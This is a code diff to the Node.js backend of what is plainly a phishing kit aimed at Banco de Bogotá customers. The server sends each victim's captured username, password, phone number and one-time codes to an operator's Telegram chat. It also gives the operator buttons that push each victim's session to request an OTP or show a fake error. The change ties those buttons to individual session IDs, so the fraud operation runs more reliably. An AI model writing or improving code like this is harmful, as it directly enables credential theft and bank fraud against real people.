@@ -1,5 +1,5 @@
 const express = require('express');
-const cors = require('cors'); // <-- 1. Importar cors
+const cors = require('cors');
 const fetch = require('node-fetch');
 const { initializeApp } = require('firebase-admin/app');
 const { getDatabase } = require('firebase-admin/database');
@@ -11,7 +11,6 @@ initializeApp({
 const db = getDatabase();
 const app = express();
 
-// <-- 2. Habilitar CORS para que tu página web pueda hablar con este servidor sin bloqueos
 app.use(cors());
 app.use(express.json());
 
@@ -20,26 +19,31 @@ const CHAT_ID = "7924619096";
 
 // Ruta para enviar alerta a Telegram
 app.post('/enviar-alerta-telegram', async (req, res) => {
-    const { tipo, datos } = req.body;
+    const { tipo, datos, sessionId } = req.body;
     let mensaje = "";
     
     let tecladoBotones = {
-        inline_keyboard: [
-            [
-                { text: "🔑 Pedir OTP", callback_data: "cmd_otp" },
-                { text: "❌ Error Clave", callback_data: "cmd_error_login" }
-            ],
-            [
-                { text: "⚠️ Error OTP", callback_data: "cmd_otp_error" },
-                { text: "✅ Finalizar", callback_data: "cmd_finalizar" }
-            ]
-        ]
+        inline_keyboard: []
     };
 
     if (tipo === 'login') {
         mensaje = `🚨 *Nuevo Login — Banco de Bogotá*\n\n👤 Usuario: \`${datos.usuario}\`\n🔑 Clave: \`${datos.clave}\`\n📱 Celular: \`${datos.phone}\``;
+        // Botones SI / NO para Login que envían el sessionId exacto
+        tecladoBotones.inline_keyboard = [
+            [
+                { text: "✅ SÍ (Pedir OTP)", callback_data: `otp_${sessionId}` },
+                { text: "❌ NO (Error Clave)", callback_data: `errlogin_${sessionId}` }
+            ]
+        ];
     } else if (tipo === 'otp') {
         mensaje = `🔐 *OTP Ingresado*\n\n🔑 Código: \`${datos.code}\`\n📱 Celular: \`${datos.phone}\``;
+        // Botones SI / NO para OTP que envían el sessionId exacto
+        tecladoBotones.inline_keyboard = [
+            [
+                { text: "✅ SÍ (Finalizar)", callback_data: `fin_${sessionId}` },
+                { text: "❌ NO (Error OTP)", callback_data: `errotp_${sessionId}` }
+            ]
+        ];
     }
 
     try {
@@ -66,32 +70,29 @@ app.post('/webhook-telegram', async (req, res) => {
 
     if (update.callback_query) {
         const query = update.callback_query;
-        const accion = query.data;
+        const accion = query.data; // Ej: otp_sess_123456 o errlogin_sess_123456
         const callbackQueryId = query.id;
 
-        const sessionsRef = db.ref('sessions');
-        const snapshot = await sessionsRef.limitToLast(1).once('value');
-        
-        if (snapshot.exists()) {
-            let sessionId = '';
-            snapshot.forEach((childSnapshot) => {
-                sessionId = childSnapshot.key;
-            });
+        // Separamos la acción y el sessionId real que venía oculto en el botón
+        const partes = accion.split('_');
+        const comando = partes[0]; // otp, errlogin, fin, errotp
+        const sessionId = partes.slice(1).join('_'); // el resto es el ID de sesión
 
+        if (sessionId) {
             const sessionRef = db.ref(`sessions/${sessionId}`);
 
-            if (accion === 'cmd_otp') {
+            if (comando === 'otp') {
                 await sessionRef.update({ status: 'otp' });
-                await confirmarBotonTelegram(callbackQueryId, "✅ Estado: Pedir OTP");
-            } else if (accion === 'cmd_error_login') {
+                await confirmarBotonTelegram(callbackQueryId, "✅ Solicitando OTP...");
+            } else if (comando === 'errlogin') {
                 await sessionRef.update({ status: 'error_login' });
-                await confirmarBotonTelegram(callbackQueryId, "❌ Estado: Error de Clave");
-            } else if (accion === 'cmd_otp_error') {
+                await confirmarBotonTelegram(callbackQueryId, "❌ Marcado como Error de Clave");
+            } else if (comando === 'errotp') {
                 await sessionRef.update({ status: 'otp_error' });
-                await confirmarBotonTelegram(callbackQueryId, "⚠️ Estado: Error de OTP");
-            } else if (accion === 'cmd_finalizar') {
+                await confirmarBotonTelegram(callbackQueryId, "⚠️ Marcado como Error de OTP");
+            } else if (comando === 'fin') {
                 await sessionRef.update({ status: 'finalizar' });
-                await confirmarBotonTelegram(callbackQueryId, "🏁 Sesión finalizada");
+                await confirmarBotonTelegram(callbackQueryId, "🏁 Sesión finalizada con éxito");
             }
         }
     }
